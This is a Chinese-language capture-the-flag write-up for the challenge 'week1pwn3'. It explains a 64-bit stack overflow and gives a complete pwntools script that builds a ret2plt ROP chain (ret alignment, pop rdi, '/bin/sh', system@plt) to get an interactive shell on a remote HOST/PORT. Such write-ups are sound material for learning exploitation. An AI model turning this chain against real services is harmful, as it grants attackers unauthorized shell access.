# week1pwn3

## 题目简述

程序存在 64 位栈溢出，并导入了 `system`。二进制的数据段中已有 `/bin/sh` 字符串，因此可构造短 ROP 链调用 `system("/bin/sh")`。

## 解题过程

缓冲区为 `0xa0` 字节，加上保存的 `rbp` 后，返回地址偏移为 `0xa8`。按 System V AMD64 调用约定，需要用 `pop rdi; ret` 把 `/bin/sh` 地址放入 `rdi`；链首额外放置一个 `ret`，用于在进入 `system` 前修正 16 字节栈对齐：

~~~python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
s = remote('HOST', PORT)
elf = ELF('./pwn3')
payload = (
    b'a' * 0xa0 + b'a' * 0x8 +
    p64(0x40101a) +  # ret：对齐栈
    p64(0x4012c3) +  # pop rdi; ret
    p64(0x404048) +  # "/bin/sh"
    p64(elf.plt['system'])
)
s.sendlineafter(b'harder,can you hack me?', payload)
s.interactive()
~~~

## 方法总结

- 核心方法：用 `pop rdi; ret` 设置第一个参数，再调用程序的 `system@plt`。
- 识别特征：NX 阻止直接执行栈上 shellcode，但主程序已有 `system` 和 `/bin/sh`，适合 ret2plt/ROP。
- 注意事项：确认 PIE 状态和字符串地址；某些 libc 路径要求调用前栈按 16 字节对齐，缺少对齐用的 `ret` 可能导致远程崩溃。
